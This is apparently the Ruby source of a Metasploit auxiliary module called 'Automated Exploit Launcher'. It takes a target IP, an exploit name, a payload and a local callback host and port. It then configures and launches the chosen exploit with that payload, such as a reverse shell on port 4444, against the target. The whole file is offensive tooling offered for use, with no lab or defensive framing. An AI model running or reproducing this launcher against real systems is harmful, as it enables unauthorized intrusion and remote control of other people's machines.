require 'msf/core'

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name'        => 'Automated Exploit Launcher',
      'Description' => 'Automatically launches a specified exploit against a target system with a payload',
      'Author'      => 'Axel Malka',
      'License'     => MSF_LICENSE
    )

    register_options(
      [
        OptString.new('RHOST', [true, 'Target IP address']),
        OptString.new('EXPLOIT', [true, 'Exploit module to use']),
        OptString.new('PAYLOAD', [true, 'Payload to use']),
        OptString.new('LHOST', [true, 'Local IP address']),
        OptInt.new('LPORT', [true, 'Local port for the payload', 4444])
      ]
    )
  end

  def run
    rhost = datastore['RHOST']
    exploit_name = datastore['EXPLOIT']
    payload_name = datastore['PAYLOAD']
    lhost = datastore['LHOST']
    lport = datastore['LPORT']

    print_status("Configuring exploit: #{exploit_name}")
    print_status("Target: #{rhost}")
    print_status("Payload: #{payload_name}")
    print_status("LHOST: #{lhost}, LPORT: #{lport}")

    # Create exploit instance
    exploit = framework.exploits.create(exploit_name)
    if exploit.nil?
      print_error("Exploit module #{exploit_name} not found.")
      return
    end

    # Set options for the exploit
    exploit.datastore['RHOST'] = rhost
    exploit.datastore['LHOST'] = lhost
    exploit.datastore['LPORT'] = lport

    # Create payload instance
    payload = framework.payloads.create(payload_name)
    if payload.nil?
      print_error("Payload #{payload_name} not found.")
      return
    end

    # Set options for the payload
    payload.datastore['LHOST'] = lhost
    payload.datastore['LPORT'] = lport

    print_status("Launching exploit #{exploit_name} against #{rhost} with payload #{payload_name}")

    begin
      # Launch the exploit
      exploit.exploit_simple(
        'Payload' => payload,
        'LocalInput' => self.user_input,
        'LocalOutput' => self.user_output,
        'RunAsJob' => false
      )
      print_good("Exploit launched successfully!")
    rescue => e
      print_error("Failed to launch exploit: #{e.message}")
    end
  end
end
